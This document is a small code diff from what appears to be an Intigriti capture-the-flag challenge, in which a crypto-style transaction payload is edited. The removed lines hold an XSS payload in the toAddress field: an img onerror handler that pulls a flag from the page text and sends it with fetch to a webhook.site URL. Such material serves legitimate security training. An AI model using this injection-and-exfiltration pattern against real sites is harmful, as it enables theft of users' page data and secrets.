@@ -21,15 +21,7 @@
                 var payload = {
                     type: 'submitTransaction',
                     transaction: {
-                        toAddress: `<img src=x onerror="
-                            const flag = document.body.innerText.match(/INTIGRITI{.*}/);
-                            if(flag) {
-                                alert('FOUND FLAG: ' + flag[0]);
-                                fetch('https://webhook.site/f174d90f-ba4f-4ee9-b67b-bdefbadc2be4/?f=' + btoa(flag[0]));
-                            } else {
-                                alert('XSS Triggered on ' + document.domain);
-                            }
-                        ">`,
+                        toAddress: `192d337b06a020958f4dd75c6888d51410`,
                         currency: '1337COIN',
                         amount: 1337
                     }
